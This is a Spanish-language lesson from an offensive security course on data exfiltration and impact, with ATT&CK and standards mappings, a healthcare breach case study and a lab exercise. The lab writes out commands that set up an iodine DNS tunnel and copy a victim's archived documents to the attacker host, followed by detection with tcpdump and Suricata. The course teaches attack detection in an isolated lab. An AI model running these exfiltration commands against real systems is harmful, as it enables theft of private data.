# Semana 15: Exfiltracion e impacto

Curso: [Ciberseguridad Ofensiva: Pensar como Atacante](../syllabus.md) · Semana 15 de 20

## Objetivo de la semana
Comprender las fases finales de una intrusión: la exfiltración de datos y las acciones de impacto sobre la confidencialidad, integridad y disponibilidad. El estudiante aprenderá a identificar canales de exfiltración (C2, DNS, HTTPS, cloud), a simular su explotación en un entorno controlado y a mapear estas tácticas contra MITRE ATT&CK (TA0010 Exfiltration y TA0040 Impact), alineando la detección con controles NIST SP 800-53, CIS Controls v8 e ISO/IEC 27001:2022.

## LECTURA

La exfiltración es el arte de sacar información del entorno comprometido sin ser detectado; el impacto es el conjunto de acciones que degradan o destruyen activos para forzar, dañar o encubrir. En MITRE ATT&CK, la táctica **TA0010 (Exfiltration)** agrupa técnicas como T1041 (Exfiltration Over C2 Channel), T1048 (Exfiltration Over Alternative Protocol), T1567 (Exfiltration Over Web Service) y T1052 (Exfiltration Over Physical Medium). La táctica **TA0040 (Impact)** incluye T1485 (Data Destruction), T1486 (Data Encrypted for Impact, típico de ransomware), T1490 (Inhibit System Recovery), T1491 (Defacement) y T1498 (Network Denial of Service). Comprender ambas es esencial porque marcan la transición del acceso a la monetización o al sabotaje.

Los canales clásicos de exfiltración son: DNS tunneling (herramientas como dnscat2, iodine), HTTPS hacia dominios legítimos de servicios cloud (T1567.002 — Exfiltration to Cloud Storage, por ejemplo abusando de Dropbox, Google Drive o Mega), ICMP, SMTP, y túneles C2 con frameworks como Cobalt Strike, Sliver o Mythic. La detección se apoya en el análisis de flujo (NetFlow), inspección TLS con JA3/JA3S, DNS con volumetría y entropía de subdominios, y DLP en endpoints y red. En cuanto a estándares: **NIST SP 800-53 Rev.5** cubre esto con controles SC-7 (Boundary Protection), SI-4 (System Monitoring) y AU-6 (Audit Review); **NIST SP 800-61** guía la respuesta a incidentes; **CIS Controls v8** aborda la exfiltración en el Control 13 (Network Monitoring and Defense) y el 3 (Data Protection); **ISO/IEC 27001:2022** lo trata en A.5.14 (Information transfer), A.8.12 (Data leakage prevention) y A.8.13 (Backup). **OWASP** aporta contexto en el Top 10 (A02:2021 Cryptographic Failures, A09:2021 Security Logging and Monitoring Failures) y en el WSTG para pruebas de fuga de información.

Desde la perspectiva ofensiva, un pentester debe medir: ¿qué datos son accesibles?, ¿qué canal permite sacarlos sin alertar al SOC?, ¿qué volumen y velocidad tolera la red antes de disparar umbrales? En la fase de impacto, se evalúa la capacidad de cifrar, borrar o inutilizar backups (T1490), lo que en ransomware real define el daño. La metodología **PTES** y **MITRE ATT&CK Evaluations** ofrecen marcos para planificar y reportar estas pruebas, siempre dentro de un alcance autorizado y con reglas de engagement firmadas.

## EJERCICIO

**Objetivo:** Simular exfiltración de datos mediante DNS tunneling y evaluar la detección con reglas básicas.

**Entorno:** Dos VMs en red aislada (atacante Kali, víctima Ubuntu con datos ficticios en `/home/victim/docs`). Sin acceso a Internet.

**Pasos:**
1. En el atacante, clona y compila `iodine`: `git clone https://github.com/yarrick/iodine && cd iodine && make`.
2. Levanta el servidor DNS tunelizado: `sudo ./bin/iodined -f -c -P MiPassword123 10.0.0.1 tun.example.com`.
3. En la víctima, instala el cliente y conecta: `sudo ./bin/iodine -f -P MiPassword123 10.0.0.1 tun.example.com`.
4. Verifica la interfaz `dns0` en ambos lados con `ip a`.
5. Empaqueta datos ficticios: `tar czf docs.tgz /home/victim/docs`.
6. Exfiltra por el túnel usando `scp` o `nc` sobre la IP `10.0.0.2` (cliente) hacia el servidor: `scp docs.tgz root@10.0.0.1:/tmp/`.
7. En el atacante, captura tráfico con `tcpdump -i any udp port 53 -w dns.pcap`.
8. Analiza con Wireshark o `tshark`: identifica subdominios largos, alta entropía y consultas TXT/A repetitivas.
9. Escribe una regla Suricata que dispare ante consultas DNS con longitud de subdominio > 50 caracteres y frecuencia > 20/segundo. Prueba con `suricata -r dns.pcap`.
10. Documenta: volumen exfiltrado, tiempo, firmas generadas y falsos positivos.

**Entregable:** Informe breve con capturas, regla Suricata funcional y recomendación de control (bloqueo de DNS externo, DNS sinkhole, DLP).

## CASO

**Caso real: exfiltración masiva en el sector salud (modelo basado en incidentes tipo Change Healthcare 2024 y Anthem 2015).**

Un grupo de amenaza persistente (APT) obtiene acceso inicial mediante credenciales válidas compradas en un mercado clandestino (técnica T1078 — Valid Accounts). Durante semanas, realiza reconocimiento interno con herramientas living-off-the-land (PowerShell, WMI) y enumera repositorios de datos clínicos. Utiliza **T1567.002 (Exfiltration to Cloud Storage)**: crea una cuenta en un proveedor de almacenamiento en la nube y, a través de HTTPS legítimo, sube archivos comprimidos y cifrados con 7-Zip, evadiendo DLP basado en firmas. Para evitar umbrales, fragmenta la exfiltración en sesiones de 200 MB cada 6 horas y usa dominios de la nube categorizados como "business" por el proxy.

El SOC detecta anomalías solo cuando el volumen agregado supera 40 GB en 72 horas. La respuesta sigue **NIST SP 800-61**: contención (aislamiento de cuentas y bloqueo de dominios de almacenamiento), erradicación (rotación de credenciales, MFA obligatorio), recuperación (verificación de integridad de backups) y lecciones aprendidas. El análisis posterior mapea el ataque a ATT&CK: TA0001, TA0007, TA0009 (Collection), TA0010 (Exfiltration) y TA0040 (Impact parcial por filtración). Las recomendaciones alineadas con **CIS Controls 3.12 (Data leakage prevention)** y **ISO 27001 A.8.12** incluyen: DLP con inspección de contenido y no solo de red, CASB para tráfico cloud, UEBA para comportamiento anómalo de cuentas, y segmentación de red para limitar movimiento lateral. El caso ilustra que la exfiltración rara vez es un evento único: es una secuencia sigilosa donde el atacante optimiza volumen, canal y horario para permanecer bajo el radar.

## Recursos abiertos
- MITRE ATT&CK — Exfiltration (TA0010): https://attack.mitre.org/tactics/TA0010/
- MITRE ATT&CK — Impact (TA0040): https://attack.mitre.org/tactics/TA0040/
- NIST SP 800-61 Rev.2 — Computer Security Incident Handling Guide: https://csrc.nist.gov/pubs/sp/800/61/r2/final
- CIS Controls v8: https://www.cisecurity.org/controls/v8
- Herramienta iodine (DNS tunneling): https://github.com/yarrick/iodine

--- [Volver al syllabus](../syllabus.md)
